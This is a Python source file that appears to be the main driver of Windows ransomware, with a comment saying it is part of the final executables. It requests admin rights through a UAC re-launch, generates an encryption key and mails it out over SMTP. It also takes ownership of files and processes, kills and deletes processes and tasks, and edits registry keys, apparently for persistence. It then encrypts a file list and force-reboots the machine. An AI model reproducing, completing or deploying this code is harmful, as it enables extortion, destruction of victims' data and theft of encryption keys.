#!/usr/bin/python
#coding:utf-8
from timeit import default_timer
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import delproc, regedit
from modules.network import host_connect, sendkey_smtp, keyserver
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time

""" THIS FILE IS PART OF THE FINAL EXECUTABLES """

# ENVIRONMENT VARIABLE
current_user = os.environ["USERNAME"]

# INITIATION OF VARIABLES TO CALL FUNCTIONS IN CLASSES
gt = takeown.GetOwn()
gr = icacls.GetPermission()
dr = delproc.Remove()
dk = delproc.Kill()
rkey = regedit.ManageKey()

# MAIN CODE
if(get_admin_rights.is_admin()):
    if host_connect.keyrcv():
        keyserver.getcrypt()
    else:
        crypt.genkey(current_user)
        sendkey_smtp.send_key()
        gt.proc()
        gr.proc()
        dk.smart()
        dr.stsk()
        rkey.setkey()
        rkey.delkey()
        rkey.setInit()
        gt.dir()
        gr.dir()
        crypt.filelist()
        dk.exp()
        dr.exp()
        # REBOOT WINDOWS
        os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)

